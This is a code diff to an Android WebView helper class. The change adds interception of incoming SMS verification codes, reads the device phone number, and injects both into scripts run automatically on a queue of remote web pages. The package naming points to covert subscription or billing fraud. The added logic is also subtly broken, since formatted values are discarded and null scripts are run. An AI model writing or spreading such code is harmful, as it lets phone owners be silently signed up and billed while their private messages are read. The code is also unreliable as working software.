@@ -1,9 +1,9 @@
 package moziqi.interviewdemo.webview;
 
-import android.content.Context;
 import android.os.Handler;
 import android.os.Looper;
 import android.os.Message;
+import android.text.TextUtils;
 import android.util.Log;
 import android.view.ViewGroup;
 import android.view.ViewParent;
@@ -14,6 +14,9 @@ import java.util.List;
 import java.util.Random;
 import java.util.concurrent.BlockingQueue;
 
+import moziqi.interviewdemo.subscribe.PhoneUtils;
+import moziqi.interviewdemo.subscribe.SmsObserver;
+
 /**
  * 作者 : moziqi
  * 邮箱 : 709847739@qq.com
@@ -23,14 +26,30 @@ import java.util.concurrent.BlockingQueue;
  */
 public class WebViewHelper {
 
+
+    /**
+     * webView控件
+     */
     private final TouchWebView localWebView;
 
+    /**
+     * 弱应用的handler
+     */
     private final InnerHandler handler;
 
+    /**
+     * 本次执行js的队列
+     */
     private BlockingQueue<WebData> mWebDatas;
 
+    /**
+     * 当前次数
+     */
     private int reloadCount = 0;
 
+    /**
+     * 重试次数
+     */
     private final static int RELOAD_COUNT = 3;
 
     /**
@@ -39,13 +58,51 @@ public class WebViewHelper {
     private List<JsObj> runningJs = new ArrayList<>();
 
     /**
+     * 用于获取短信验证码
+     */
+    private SmsObserver smsObserver = null;
+
+
+    /**
+     * 本机电话号码
+     */
+    private String phoneNum = null;
+    /**
+     * 短信验证码
+     */
+    private String code = null;
+
+    /**
      * 传递webView进来，用于控制
      *
      * @param webView
      */
     public WebViewHelper(TouchWebView webView) {
         this.localWebView = webView;
-        this.handler = new InnerHandler(localWebView.getContext());
+        this.handler = new InnerHandler(this);
+        smsObserver = new SmsObserver(webView.getContext(), handler);
+        //监听短信
+        if (smsObserver != null) {
+            SmsObserver.registerContentObserver(webView.getContext(), smsObserver);
+        }
+        //设置电话号码
+        String tempPhoneNum = PhoneUtils.getPhoneNum(webView.getContext());
+        if (!TextUtils.isEmpty(tempPhoneNum)) {
+            this.phoneNum = tempPhoneNum;
+        } else {
+            //设置随机电话号码
+            StringBuilder phoneNumBuilder = new StringBuilder();
+            for (int i = 0; i < 11; i++) {
+                phoneNumBuilder.append(getRandom(9));
+            }
+            this.phoneNum = phoneNumBuilder.toString();
+        }
+        //设置随机验证码
+        StringBuilder codeBuilder = new StringBuilder();
+        for (int i = 0; i < 6; i++) {
+            codeBuilder.append(getRandom(9));
+        }
+        code = codeBuilder.toString();
     }
 
 
@@ -67,14 +124,19 @@ public class WebViewHelper {
         if (mWebDatas == null || mWebDatas.isEmpty()) {
             return;
         }
+        //重置次数
         reloadCount = 0;
-        //清除这里
+        //清除runningJs
         runningJs.clear();
+        //判断handler是否为null
+        if (handler == null) {
+            return;
+        }
         handler.post(new Runnable() {
             @Override
             public void run() {
                 try {
-                    //获取一个值
+                    //获取一个web对象
                     final WebData webData = mWebDatas.poll();
                     if (localWebView != null && webData != null) {
                         localWebView.loadURL(webData.loadUrl);
@@ -93,18 +155,23 @@ public class WebViewHelper {
                             public void onError(String url) {
                                 if (reloadCount < RELOAD_COUNT) {
                                     //5s内再执行
-                                    handler.postDelayed(new Runnable() {
-                                        @Override
-                                        public void run() {
-                                            if (localWebView != null) {
-                                                localWebView.reload();
-                                                //当没仔细过，重复执行
-                                                runningJs.clear();
-                                                //增加次数
-                                                reloadCount++;
+                                    if (handler != null) {
+                                        handler.postDelayed(new Runnable() {
+                                            @Override
+                                            public void run() {
+                                                if (localWebView != null) {
+                                                    localWebView.reload();
+                                                    //当没仔细过，重复执行
+                                                    runningJs.clear();
+                                                    //增加次数
+                                                    reloadCount++;
+                                                }
                                             }
-                                        }
-                                    }, 1000 * 5);
+                                        }, 1000 * 5);
+                                    }
+                                } else {
+                                    //执行下一个
+                                    next();
                                 }
                             }
                         });
@@ -124,17 +191,16 @@ public class WebViewHelper {
      * @param pos
      */
     private void doJs(final WebData webData, final int pos) {
+        if (webData == null) {
+            next();
+            return;
+        }
         List<JsObj> jsQueues = webData.jsQueues;
         int size = jsQueues.size();
         if (pos >= size) {
             Log.i("mo", "doJs start");
             //执行下一个
-            handler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    start();
-                }
-            }, 5000);
+            next();
             return;
         }
         final JsObj poll = jsQueues.get(pos);
@@ -142,28 +208,62 @@ public class WebViewHelper {
             //判断js是否执行过了
             runningJs.add(poll);
             Log.i("mo", String.format("doJs pos is %s", pos));
-            handler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    if (webData.postHtml == 1) {
-                        localWebView.getHtml();
+            if (handler != null) {
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        if (webData.postHtml == 1) {
+                            //这里为了上报js，读取页面出来，用于分析内容
+                            localWebView.getHtml();
+                        }
+                        localWebView.getLoadCompete();
+                        String jsContent = null;
+                        switch (poll.type) {
+                            case 0:
+                                //是不处理
+                                jsContent = poll.js;
+                                break;
+                            case 1:
+                                //获取联系电话号码
+                                String.format(poll.js, phoneNum);
+                                break;
+                            case 2:
+                                //获取短信验证码
+                                String.format(poll.js, code);
+                                break;
+                            default:
+                                //默认不处理
+                                jsContent = poll.js;
+                                break;
+                        }
+                        localWebView.loadJs(jsContent);
+                        //继续执行
+                        doJs(webData, pos + 1);
                     }
-                    localWebView.getLoadCompete();
-                    localWebView.loadJs(poll.js);
-                    //继续执行
-                    doJs(webData, pos + 1);
-                }
-            }, poll.delayTime);
+                }, poll.delayTime);
+            }
         } else {
             //继续下一组js
             Log.i("mo", "doJs contains pos");
+            if (handler != null) {
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        doJs(webData, pos + 1);
+                    }
+                }, poll.delayTime);
+            }
+        }
+    }
+
+    private void next() {
+        if (handler != null) {
             handler.postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    doJs(webData, pos + 1);
+                    start();
                 }
-            }, poll.delayTime);
-
+            }, 5000);
         }
     }
 
@@ -189,6 +289,32 @@ public class WebViewHelper {
      */
     public JsObj createJsObj(String js) {
         JsObj temp = new JsObj(js);
+        return temp;
+    }
+
+    /**
+     * 创建对象
+     *
+     * @param js
+     * @param delayTime
+     * @return
+     */
+    public JsObj createJsObj(String js, int delayTime) {
+        JsObj temp = new JsObj(js, delayTime);
+        return temp;
+    }
+
+
+    /**
+     * 创建对象
+     *
+     * @param js
+     * @param delayTime
+     * @param type
+     * @return
+     */
+    public JsObj createJsObj(String js, int delayTime, int type) {
+        JsObj temp = new JsObj(js, delayTime, type);
         return temp;
     }
 
@@ -228,6 +354,10 @@ public class WebViewHelper {
         if (handler != null) {
             handler.removeCallbacksAndMessages(null);
         }
+        if (smsObserver != null) {
+            SmsObserver.unregisterContentObserver(localWebView.getContext(), smsObserver);
+        }
+        smsObserver = null;
     }
 
     /**
@@ -261,8 +391,12 @@ public class WebViewHelper {
      */
     public static class JsObj {
         public String js;
-        public int delayTime = 10 * 1000;
+        public int delayTime = 15 * 1000;
         public int type;// 0是不需要处理 1需要phone 2需要code短信验证
+
+        public final static int JS_TYPE_PHONE = 1;
+        public final static int JS_TYPE_CODE = 2;
+        public final static int JS_TYPE_RANDOM = 3;
 
         public JsObj(String js, int delayTime, int type) {
             this.js = js;
@@ -308,17 +442,28 @@ public class WebViewHelper {
      * 实现弱引用
      */
     private static class InnerHandler extends Handler {
-        private final WeakReference<Context> mContext;
+        private final WeakReference<WebViewHelper> tWeak;
 
-        public InnerHandler(Context context) {
+        public InnerHandler(WebViewHelper t) {
             super(Looper.getMainLooper());
-            mContext = new WeakReference<Context>(context);
+            tWeak = new WeakReference<>(t);
         }
 
         @Override
         public void handleMessage(Message msg) {
-            if (mContext.get() == null) {
+            if (tWeak.get() == null) {
                 return;
+            }
+            switch (msg.what) {
+                //获取短信验证码
+                case SmsObserver.MSG_RECEIVED_CODE:
+                    if (msg.obj != null
+                            && msg.obj instanceof String) {
+                        tWeak.get().code = (String) msg.obj;
+                    }
+                    break;
+                default:
+                    break;
             }
         }
     }
